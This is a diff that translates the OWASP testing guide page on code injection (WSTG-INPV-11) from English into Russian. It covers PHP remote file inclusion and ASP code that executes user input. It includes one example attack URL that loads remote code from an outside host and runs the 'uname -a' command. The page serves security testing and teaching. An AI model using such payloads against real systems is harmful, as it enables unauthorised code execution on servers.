@@ -7,40 +7,40 @@ tags: WSTG
 ---
 
 {% include breadcrumb.html %}
-# Testing for Code Injection
+# Тестирование инъекции кода
 
 |ID          |
 |------------|
 |WSTG-INPV-11|
 
-## Summary
+## Обзор
 
-This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.
+В этом разделе описывается, как тестировщик может проверить, можно ли ввести код в качестве входных данных на web-странице и выполнить его на web-сервере.
 
-In [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.
+При тестировании [инъекции кода](https://owasp.org/www-community/attacks/Code_Injection) тестировщик отправляет входные данные, которые обрабатываются web-сервером как динамический код или как включенный файл. Эти тесты могут быть нацелены на различные серверные скриптовые фреймворки, например, ASP или PHP. Для защиты от этих атак необходимо использовать надлежащий контроль входных данных и методы безопасной разработки.
 
-## Test Objectives
+## Задачи тестирования
 
-- Identify injection points where you can inject code into the application.
-- Assess the injection severity.
+- Найти точки для инъекции, где вы можете вставить код в приложение.
+- Оцените воздействие инъекции.
 
-## How to Test
+## Как тестировать
 
-### Black-Box Testing
+### Тестирование методом чёрного ящика
 
-#### Testing for PHP Injection Vulnerabilities
+#### Тестирование уязвимостей PHP-инъекций
 
-Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:
+Используя строку запроса, тестировщик может ввести код (в данном примере вредоносный URL), который будет обработан как часть включенного файла:
 
 `http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`
 
-> The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.
+> Вредоносный URL принимается в качестве параметра для страницы PHP, которая позже будет использовать это значение во включенном файле.
 
-### Gray-Box Testing
+### Тестирование методом серого ящика
 
-#### Testing for ASP Code Injection Vulnerabilities
+#### Тестирование на наличие уязвимостей для инъекции кода ASP
 
-Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:
+Проанализируйте код ASP на предмет пользовательского ввода в функциях выполнения. Может ли пользователь вводить команды в поле ввода данных? Здесь код ASP сохранит входные данные в файл, а затем выполнит его:
 
 ```asp
 <%
@@ -69,9 +69,9 @@ End If
 %>)))
 ```
 
-### References
+### Ссылки
 
 - [Security Focus](http://www.securityfocus.com)
 - [Insecure.org](http://www.insecure.org)
-- [Wikipedia](http://www.wikipedia.org)
+- [Wikipedia](https://en.wikipedia.org/wiki/Code_injection)
 - [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)
